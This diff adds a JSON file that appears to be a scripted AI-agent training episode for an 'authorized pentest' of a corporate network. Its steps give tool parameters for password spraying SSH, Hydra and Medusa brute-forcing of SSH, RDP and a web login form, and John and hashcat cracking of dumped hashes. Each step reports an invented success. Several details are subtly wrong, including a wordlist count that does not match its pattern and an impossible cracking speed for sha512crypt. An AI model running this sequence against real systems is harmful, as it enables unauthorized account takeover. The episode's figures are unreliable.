@@ -1,0 +1,92 @@
+{
+  "episode_id": "PENT_PASSWD_HYDRA_JOHN_EP01",
+  "title": "Corporate Network Password Attack",
+  "description": "Authorized pentest - bruteforce SSH/RDP, crack hashes from compromised database",
+  "difficulty": "intermediate",
+  "steps": [
+    {
+      "step_number": 1,
+      "instruction": "Generate corporate password wordlist",
+      "tool": "crunch_custom_wordlist_generation",
+      "parameters": {
+        "min_len": "8",
+        "max_len": "12",
+        "charset": "",
+        "pattern": "Company@@@@%%"
+      },
+      "expected_outcome": "Generated 45M passwords: Company0000 to Companyzzzz99 - corporate naming pattern"
+    },
+    {
+      "step_number": 2,
+      "instruction": "Password spray SSH service",
+      "tool": "password_spray_attack",
+      "parameters": {
+        "userlist": "/opt/users.txt",
+        "password": "Summer2024!",
+        "target": "192.168.1.100",
+        "delay": "3"
+      },
+      "expected_outcome": "Found 8 accounts using 'Summer2024!' - 500 users tested, no lockouts"
+    },
+    {
+      "step_number": 3,
+      "instruction": "Bruteforce admin account",
+      "tool": "hydra_ssh_ftp_bruteforce",
+      "parameters": {
+        "service": "ssh",
+        "target": "192.168.1.100",
+        "userlist": "admin_users.txt",
+        "passlist": "rockyou.txt"
+      },
+      "expected_outcome": "Found: admin:password123, sysadmin:admin2024 - 2 privileged accounts compromised"
+    },
+    {
+      "step_number": 4,
+      "instruction": "Attack RDP on Windows servers",
+      "tool": "medusa_parallel_bruteforce",
+      "parameters": {
+        "service": "rdp",
+        "target": "192.168.1.0/24",
+        "userlist": "users.txt",
+        "passlist": "passwords.txt"
+      },
+      "expected_outcome": "12 Windows hosts: 5 RDP logins found - Administrator, backup accounts"
+    },
+    {
+      "step_number": 5,
+      "instruction": "Attack web admin panel",
+      "tool": "hydra_http_post_form_attack",
+      "parameters": {
+        "target_url": "https://admin.company.local",
+        "form_params": "/login.php:username=^USER^&password=^PASS^:F=Invalid",
+        "userlist": "web_users.txt",
+        "passlist": "corporate_wordlist.txt"
+      },
+      "expected_outcome": "Web panel access: admin:Welcome2024! - admin dashboard compromised"
+    },
+    {
+      "step_number": 6,
+      "instruction": "Extract hashes from compromised database",
+      "tool": "john_the_ripper_hash_cracking",
+      "parameters": {
+        "hashfile": "/tmp/dumped_hashes.txt",
+        "wordlist": "/usr/share/wordlists/rockyou.txt",
+        "format": "sha512crypt"
+      },
+      "expected_outcome": "John cracked 15/30 hashes in 45 minutes - plaintext passwords recovered"
+    },
+    {
+      "step_number": 7,
+      "instruction": "GPU accelerate remaining hashes",
+      "tool": "hashcat_gpu_accelerated_cracking",
+      "parameters": {
+        "hash_file": "/tmp/remaining_hashes.txt",
+        "wordlist": "rockyou.txt",
+        "hash_type": "1800"
+      },
+      "expected_outcome": "Hashcat cracked 8 more hashes at 12GH/s - total 23/30 passwords recovered"
+    }
+  ],
+  "success_criteria": "Compromised 23 accounts via bruteforce and hash cracking, demonstrated weak password policy",
+  "cleanup": "Reported findings: password spray successful, weak passwords (Summer2024!), recommend MFA and complexity requirements"
+}
